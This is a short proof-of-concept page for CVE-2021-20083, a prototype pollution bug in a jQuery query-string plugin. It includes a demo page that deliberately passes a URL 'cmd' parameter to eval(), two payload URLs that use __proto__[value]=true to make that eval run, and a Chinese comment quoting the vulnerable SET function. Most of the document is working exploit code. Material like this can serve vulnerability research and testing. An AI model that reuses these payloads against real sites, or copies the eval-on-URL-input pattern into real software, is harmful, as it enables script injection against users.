<p id="debug"></p>
<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
<script src="https://raw.githack.com/alrusdi/jquery-plugin-query-object/9e5871fbb531c5e246aac2aaf056b237bc7cc0a6/jquery.query-object.js"></script>
<script>
  let debug = Object.create(null);
  debug.enabled = false;
  let descriptor = {
    configurable:false, 
    writable:false
  };
  Object.defineProperty(debug, 'enabled', descriptor);
</script>
<script>
  let debugContainer = $('#debug');
  let message = 'You don\t look like an admin!';
  if (debug.enabled) {
    message = eval($.query.get('cmd'));
  }
  let text = document.createTextNode(message);
  debugContainer.append(text);
</script>

//poc
//http://127.0.0.1/cve-2021-20083-exp.html#__proto__[value]=true&cmd=alert(0x1337)
//http://127.0.0.1/cve-2021-20083-exp.html?__proto__[value]=true&cmd=alert(0x1337)

/*注入点
https://raw.githack.com/alrusdi/jquery-plugin-query-object/9e5871fbb531c5e246aac2aaf056b237bc7cc0a6/jquery.query-object.js
漏洞代码处，这里获取url上的值，设置为空对象的value=true
SET: function(key, val) {
        var value = !is(val) ? null : val;
        var parsed = parse(key), base = parsed[0], tokens = parsed[1];
        var target = this.keys[base];
        this.keys[base] = set(target, tokens.slice(0), value);
        return this;
      },

*/
